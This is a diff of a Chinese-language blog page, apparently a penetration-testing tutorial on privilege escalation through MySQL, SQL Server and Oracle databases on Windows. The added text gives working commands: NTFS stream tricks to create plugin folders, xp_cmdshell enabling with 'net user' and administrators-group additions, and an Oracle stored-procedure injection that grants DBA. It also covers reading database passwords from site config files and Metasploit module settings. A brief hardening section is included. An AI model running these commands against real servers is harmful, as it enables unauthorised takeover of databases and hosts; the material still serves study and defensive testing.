@@ -79,12 +79,12 @@
 
 
 
-<meta name="description" content="提权总结之各种数据库提权方法总结mysql之UDF提权原理分析：​        UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方">
+<meta name="description" content="渗透测试中常见提权方式总结（一）数据库提权mysql之UDF提权原理分析：​        UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX">
 <meta property="og:type" content="article">
-<meta property="og:title" content="渗透测试中常见提权方式总结(二)">
+<meta property="og:title" content="windows渗透测试中常见提权方式总结(二)">
 <meta property="og:url" content="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="提权总结之各种数据库提权方法总结mysql之UDF提权原理分析：​        UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方">
+<meta property="og:description" content="渗透测试中常见提权方式总结（一）数据库提权mysql之UDF提权原理分析：​        UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX">
 <meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428160603.png">
 <meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428160926.png">
 <meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428163445.png">
@@ -97,8 +97,9 @@
 <meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190009.png">
 <meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190809.png">
 <meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428184713.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190611101318911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70">
 <meta property="article:published_time" content="2020-04-28T01:56:41.000Z">
-<meta property="article:modified_time" content="2020-04-28T11:29:11.023Z">
+<meta property="article:modified_time" content="2020-04-29T05:42:43.706Z">
 <meta property="article:author" content="Shu1L">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428160603.png">
@@ -137,7 +138,7 @@
 
 
 
-  <title>渗透测试中常见提权方式总结(二) | Hexo</title>
+  <title>windows渗透测试中常见提权方式总结(二) | Hexo</title>
   
 
 
@@ -291,7 +292,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">渗透测试中常见提权方式总结(二)</h1>
+          <h1 class="post-title" itemprop="name headline">windows渗透测试中常见提权方式总结(二)</h1>
         
 
         <div class="post-meta">
@@ -341,7 +342,7 @@
       
 
       
-        <h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="提权总结之各种数据库提权方法总结"><a href="#提权总结之各种数据库提权方法总结" class="headerlink" title="提权总结之各种数据库提权方法总结"></a>提权总结之各种数据库提权方法总结</h2><h3 id="mysql之UDF提权"><a href="#mysql之UDF提权" class="headerlink" title="mysql之UDF提权"></a>mysql之UDF提权</h3><h4 id="原理分析："><a href="#原理分析：" class="headerlink" title="原理分析："></a>原理分析：</h4><p>​        <strong>UDF</strong>(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
+        <h2 id="渗透测试中常见提权方式总结（一）"><a href="#渗透测试中常见提权方式总结（一）" class="headerlink" title="渗透测试中常见提权方式总结（一）"></a>渗透测试中常见提权方式总结（一）</h2><h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="mysql之UDF提权"><a href="#mysql之UDF提权" class="headerlink" title="mysql之UDF提权"></a>mysql之UDF提权</h4><h4 id="原理分析："><a href="#原理分析：" class="headerlink" title="原理分析："></a>原理分析：</h4><p>​        <strong>UDF</strong>(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
 <p>​    <strong>动态链接库</strong>：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p>
 <p>​    <strong>udf是Mysql类提权的方式之一</strong>。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p>
 <h4 id="提权常见手法："><a href="#提权常见手法：" class="headerlink" title="提权常见手法："></a>提权常见手法：</h4><p>一般来说使用udf提权的常规手法：</p>
@@ -355,9 +356,9 @@
 <li><p>利用SQLMAP中的-d参数连接远程数据库，自动上传so库完成UDF提权，从而获取os-shell</p>
 </li>
 <li><p>使用Navicat等数据库管理工具连接远程数据库，从而完成UDF提权。</p>
+<p>其实这些手法的主要目的都是<strong>想方设法登陆数据库服务来执行SQL语句，进而获取到启动MySQL服务的root权限，</strong></p>
 </li>
 </ul>
-<p>  其实这些手法的主要目的都是<strong>想方设法登陆数据库服务来执行SQL语句，进而获取到启动MySQL服务的root权限，</strong></p>
 <h4 id="提权的一些前提："><a href="#提权的一些前提：" class="headerlink" title="提权的一些前提："></a>提权的一些前提：</h4><p>利用udf提权有一些利用的先决条件：</p>
 <ul>
 <li>MySQL 数据库没有开启安全模式。</li>
@@ -393,7 +394,10 @@
 <li>如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</li>
 </ul>
 <p>但是mysql默认状态下没有这个文件夹，需要我们自行创建。</p>
-<p>我直接在菜刀下创建plugin文件夹</p>
+<p>用NTFS ADS流模式突破进而创建文件夹</p>
+<pre><code>select @@basedir;  //查找到mysql的目录
+select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#39;;    //利用NTFS ADS创建lib目录
+select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#39;;    //利用NTFS ADS创建plugin目录</code></pre><p>我直接在菜刀下创建plugin文件夹</p>
 <p>然后最关键的一步：<strong>导出UDF文件</strong></p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428165018.png" alt=""></p>
 <p>导出后，再次尝试文件已经存在，说明导入成功。</p>
@@ -410,7 +414,7 @@
 <p>注：这里注意版本，适用于5.5.9以下，</p>
 <h5 id="sqlmap命令"><a href="#sqlmap命令" class="headerlink" title="sqlmap命令"></a>sqlmap命令</h5><p>使用SQLMAP的-d命令来连接服务并执行UDF提权语句；</p>
 <pre><code>sqlmap -d mysql://root:xxxxxx@VPS:3306/mysql --os-shell</code></pre><h3 id="mysql数据库提权之MOF提权"><a href="#mysql数据库提权之MOF提权" class="headerlink" title="mysql数据库提权之MOF提权"></a>mysql数据库提权之MOF提权</h3><h4 id="原理分析：-1"><a href="#原理分析：-1" class="headerlink" title="原理分析："></a>原理分析：</h4><p>利用了<code>c:/windows/system32/wbem/mof/</code>目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p>
-<h4 id="提取复现："><a href="#提取复现：" class="headerlink" title="提取复现："></a>提取复现：</h4><p>首先需要具备Mysql的<code>root</code>权限，我们还是使用上面菜刀连接获得的webshell</p>
+<h4 id="提权复现："><a href="#提权复现：" class="headerlink" title="提权复现："></a>提权复现：</h4><p>首先需要具备Mysql的<code>root</code>权限，我们还是使用上面菜刀连接获得的webshell</p>
 <p>然后我们将<code>nullevt.mof</code>导入到一下可写目录</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428185617.png" alt=""></p>
 <p>文件内容：</p>
@@ -441,10 +445,92 @@ Filter = $EventFilter;
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190009.png" alt=""></p>
 <p>执行后，到win2003上查看用户：</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190809.png" alt=""></p>
+<p>之后我们可以将自定义的命令改为：</p>
+<pre><code>net.exe localgroup administrators test /add</code></pre><p>即可对添加的用户进行提权。</p>
 <h4 id="其他mof提权方法："><a href="#其他mof提权方法：" class="headerlink" title="其他mof提权方法："></a>其他mof提权方法：</h4><h5 id="msf-mof提权"><a href="#msf-mof提权" class="headerlink" title="msf mof提权"></a>msf mof提权</h5><p>使用<code>mysql_mof</code>模块，有的版本不能成功，</p>
 <h5 id="上传mof-php"><a href="#上传mof-php" class="headerlink" title="上传mof.php"></a>上传mof.php</h5><p>直接上传mof.php执行命令</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428184713.png" alt=""></p>
 <p>我试了几次都失败了，这里应该需要开启mysql远程连接的功能。。。。</p>
+<h4 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h4><p>​        Mysql Root权限MOF方法提权其前提条件是能够将上传的nullevt.mof复制到系统目录下，例如c:\windows\system32\wbem\mof中，如果无法复制则会提权失败。一般对Windows2003以下操作系统效果较好，Windows2008以上由于保护机制，较少能够成功。因此可以采取以下措施进行防范：</p>
+<ul>
+<li>在程序数据库连接文件中尽量不要使用Root帐号进行连接。</li>
+<li>Root帐号使用强加密方式，采用字母大小写+数字+特殊字符，密码位数15位以上。</li>
+<li>对Mysql数据库的mysql数据库目录权限严格限制，IIS用户无法读写该文件。</li>
+</ul>
+<h3 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL  Server提权"></a>SQL  Server提权</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p><img src="https://img-blog.csdnimg.cn/20190611101318911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>xp_cmdshell是Sql Server中的一个组件，我们可以用它来执行系统命令。</p>
+<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p><strong>利用前提：</strong></p>
+<ul>
+<li>getshell或者存在sql注入并且能够执行命令</li>
+<li>sql server是system权限，sql server默认就是system权限。</li>
+<li>获取SA用户口令</li>
+</ul>
+<h5 id="获取SA用户口令方法"><a href="#获取SA用户口令方法" class="headerlink" title="获取SA用户口令方法"></a>获取SA用户口令方法</h5><ul>
+<li>Webshell或源码获取，一般在网站的配置文件中有存放明文账号密码，常用配置文件名如：</li>
+</ul>
+<pre><code>conn.aspx
+config.aspx
+config.php
+web.config
+.........
+
+一般格式如：
+
+server=localhost;
+UID=sa;
+PWD=shadowflow</code></pre><p>获得sa口令，即可通过我们上传的大马进行登录，获得sa相应权限</p>
+<p>有了xp_cmdshell的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。</p>
+<h5 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h5><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;
+exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;</code></pre><h5 id="关闭xp-cmdshell"><a href="#关闭xp-cmdshell" class="headerlink" title="关闭xp_cmdshell"></a>关闭xp_cmdshell</h5><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;
+exec sp_configure &#39;xp_cmdshell&#39;, 0;reconfigure</code></pre><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><pre><code>exec master..xp_cmdshell &#39;net user test pinohd123. /add&#39;    添加用户test，密码test
+exec master..xp_cmdshell &#39;net localgroup administrators test add&#39;    添加test用户到管理员组</code></pre><h3 id="Oracle数据库提权之注入存储过程提权"><a href="#Oracle数据库提权之注入存储过程提权" class="headerlink" title="Oracle数据库提权之注入存储过程提权"></a>Oracle数据库提权之注入存储过程提权</h3><h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>SYS创建的存储过程存在sql注入。拥有<code>create procedure</code>权限的用户通过创建提权函数，将提权函数注入到存储过程中，于是该存储过程将调用这个提权函数来执行<code>grant dba to quan</code>命令，获得<strong>Oracle数据库dba权限</strong>。</p>
+<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
+<li>SYS创建的存储过程<code>存在sql注入</code>（EG：CVE-2005-4832）</li>
+<li>用户拥有<code>create procedure</code>权限（用来创建函数）</li>
+</ul>
+<h4 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h4><p>假设有一个用户quan 只有 CONNECT 和 RESOURCE 权限</p>
+<h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><ul>
+<li>用户登陆后执行<code>select * from session_privs</code>查看权限</li>
+<li>创建函数，命令为<code>grant dba to quan</code></li>
+</ul>
+<p>grant execute on pwn to public;//赋予所有用户此函数的执行权限</p>
+<pre><code>SQL&gt;create or replace function pwn return vaarchar2
+authid current_user is pragma autonomous_transaction;
+begin
+execute immediate &#39;grant dba to quan&#39;;
+return &#39;&#39;;
+end;
+/
+
+SQL&gt;grant execute on pwn to public;
+/</code></pre><p>注入sys.dbms_cdc_subscribe.activate_subscription</p>
+<pre><code>SQL&gt;begin
+sys.dbms_cdc_subscribe.activate_subscription(&#39;&#39;&#39;||quan.pwn()||&#39;&#39;&#39;);
+end;
+/
+
+SQL&gt;set role dba;</code></pre><p>执行<code>select * from session_privs</code>查看是否为dba权限</p>
+<h5 id="利用MSF注入"><a href="#利用MSF注入" class="headerlink" title="利用MSF注入"></a>利用MSF注入</h5><p>1.加载攻击模块</p>
+<pre><code>use auxiliary/sqli/oracle/dbms_cdc_subscribe.activate_subscription</code></pre><p>2.配置参数</p>
+<pre><code>set dbuser quan
+
+set dbpass quan123
+
+set sid orcl
+
+set rhost xxxxx
+
+set sql grant dba to quan</code></pre><p>3.run</p>
+<h3 id="Oracle数据库提权之通过utl-http-request存储过程提权"><a href="#Oracle数据库提权之通过utl-http-request存储过程提权" class="headerlink" title="Oracle数据库提权之通过utl_http.request存储过程提权"></a>Oracle数据库提权之通过utl_http.request存储过程提权</h3><h4 id="原理分析-2"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h4><p>Oracle9i~11gR2中<code>dbms_xmlquery.newcontext()</code>和<code>dbms_xmlquery.getxml()</code>函数可以执行任意PL/SQL语句，利用这两个函数可以获得Oracle服务器的<strong>操作系统权限</strong>。</p>
+<h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
+<li>UTL_HTTP存储过程可用</li>
+<li>Oracle9i~11gR2</li>
+</ul>
+<h4 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h4><ol>
+<li>创建Java包</li>
+<li>创建存储过程MYJAVACMD</li>
+<li>执行存储过程，成功添加用户</li>
+</ol>
 <h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/7392#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7392#toc-10</a></p>
 
       
@@ -480,8 +566,8 @@ Filter = $EventFilter;
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/" rel="prev" title="渗透测试中常见提权方式总结(三)">
-                渗透测试中常见提权方式总结(三) <i class="fa fa-chevron-right"></i>
+              <a href="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/" rel="prev" title="windows中常见提权方式总结(三)">
+                windows中常见提权方式总结(三) <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -563,7 +649,7 @@ Filter = $EventFilter;
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -574,7 +660,7 @@ Filter = $EventFilter;
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -618,7 +704,7 @@ Filter = $EventFilter;
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text"></span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权总结之各种数据库提权方法总结"><span class="nav-number"></span> <span class="nav-text">提权总结之各种数据库提权方法总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql之UDF提权"><span class="nav-number"></span> <span class="nav-text">mysql之UDF提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原理分析："><span class="nav-number">1.</span> <span class="nav-text">原理分析：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权常见手法："><span class="nav-number">2.</span> <span class="nav-text">提权常见手法：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权的一些前提："><span class="nav-number">3.</span> <span class="nav-text">提权的一些前提：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权复现"><span class="nav-number">4.</span> <span class="nav-text">提权复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他udf提权方法："><span class="nav-number">5.</span> <span class="nav-text">其他udf提权方法：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#msf-udp模块"><span class="nav-number">5.1.</span> <span class="nav-text">msf udp模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sqlmap命令"><span class="nav-number">5.2.</span> <span class="nav-text">sqlmap命令</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql数据库提权之MOF提权"><span class="nav-number"></span> <span class="nav-text">mysql数据库提权之MOF提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原理分析：-1"><span class="nav-number">1.</span> <span class="nav-text">原理分析：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提取复现："><span class="nav-number">2.</span> <span class="nav-text">提取复现：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他mof提权方法："><span class="nav-number">3.</span> <span class="nav-text">其他mof提权方法：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#msf-mof提权"><span class="nav-number">3.1.</span> <span class="nav-text">msf mof提权</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#上传mof-php"><span class="nav-number">3.2.</span> <span class="nav-text">上传mof.php</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考文章"><span class="nav-number">3.3.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透测试中常见提权方式总结（一）"><span class="nav-number">1.</span> <span class="nav-text">渗透测试中常见提权方式总结（一）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#数据库提权"><span class="nav-number">1.1.</span> <span class="nav-text">数据库提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql之UDF提权"><span class="nav-number">1.1.1.</span> <span class="nav-text">mysql之UDF提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#原理分析："><span class="nav-number">1.1.2.</span> <span class="nav-text">原理分析：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权常见手法："><span class="nav-number">1.1.3.</span> <span class="nav-text">提权常见手法：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权的一些前提："><span class="nav-number">1.1.4.</span> <span class="nav-text">提权的一些前提：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权复现"><span class="nav-number">1.1.5.</span> <span class="nav-text">提权复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他udf提权方法："><span class="nav-number">1.1.6.</span> <span class="nav-text">其他udf提权方法：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#msf-udp模块"><span class="nav-number">1.1.6.1.</span> <span class="nav-text">msf udp模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sqlmap命令"><span class="nav-number">1.1.6.2.</span> <span class="nav-text">sqlmap命令</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql数据库提权之MOF提权"><span class="nav-number">1.2.</span> <span class="nav-text">mysql数据库提权之MOF提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原理分析：-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">原理分析：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权复现："><span class="nav-number">1.2.2.</span> <span class="nav-text">提权复现：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他mof提权方法："><span class="nav-number">1.2.3.</span> <span class="nav-text">其他mof提权方法：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#msf-mof提权"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">msf mof提权</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#上传mof-php"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">上传mof.php</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防范方法"><span class="nav-number">1.2.4.</span> <span class="nav-text">防范方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-Server提权"><span class="nav-number">1.3.</span> <span class="nav-text">SQL  Server提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原理分析"><span class="nav-number">1.3.1.</span> <span class="nav-text">原理分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用过程"><span class="nav-number">1.3.2.</span> <span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#获取SA用户口令方法"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">获取SA用户口令方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#开启xp-cmdshell"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">开启xp_cmdshell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#关闭xp-cmdshell"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">关闭xp_cmdshell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#提权"><span class="nav-number">1.3.2.4.</span> <span class="nav-text">提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle数据库提权之注入存储过程提权"><span class="nav-number">1.4.</span> <span class="nav-text">Oracle数据库提权之注入存储过程提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原理分析-1"><span class="nav-number">1.4.1.</span> <span class="nav-text">原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#利用条件"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">利用条件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权步骤"><span class="nav-number">1.4.2.</span> <span class="nav-text">提权步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#手工注入"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">手工注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用MSF注入"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">利用MSF注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle数据库提权之通过utl-http-request存储过程提权"><span class="nav-number">1.5.</span> <span class="nav-text">Oracle数据库提权之通过utl_http.request存储过程提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原理分析-2"><span class="nav-number">1.5.1.</span> <span class="nav-text">原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#利用条件-1"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">利用条件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权步骤-1"><span class="nav-number">1.5.2.</span> <span class="nav-text">提权步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#参考文章"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></li></ol></li></ol></div>
             
 
           </div>
